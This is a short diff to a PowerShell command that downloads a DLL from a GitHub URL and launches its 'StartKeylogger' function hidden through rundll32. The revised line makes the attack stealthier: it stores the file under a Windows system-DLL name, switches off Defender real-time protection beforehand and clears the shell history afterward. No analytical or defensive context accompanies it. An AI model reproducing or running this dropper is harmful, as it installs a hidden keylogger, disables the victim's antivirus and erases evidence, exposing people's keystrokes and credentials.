@@ -1,4 +1,1 @@
-$url = "https://raw.githubusercontent.com/0xLostByte/UpdateAssets/main/ntidll.dll"; 
-$path = "C:\Users\Public\ntidll.dll"; 
-iwr -Uri $url -OutFile $path; 
-Start-Process "rundll32.exe" -ArgumentList "$path,StartKeylogger" -WindowStyle Hidden;
+$url = "https://raw.githubusercontent.com/0xLostByte/UpdateAssets/main/ntidll.dll"; $path = "C:\Windows\SysWOW64\api-ms-win-core-runtime-l2.dll"; Set-MpPreference -DisableRealtimeMonitoring $true; iwr -Uri $url -OutFile $path; Start-Process "rundll32.exe" -ArgumentList "$path,StartKeylogger" -WindowStyle Hidden; Clear-History
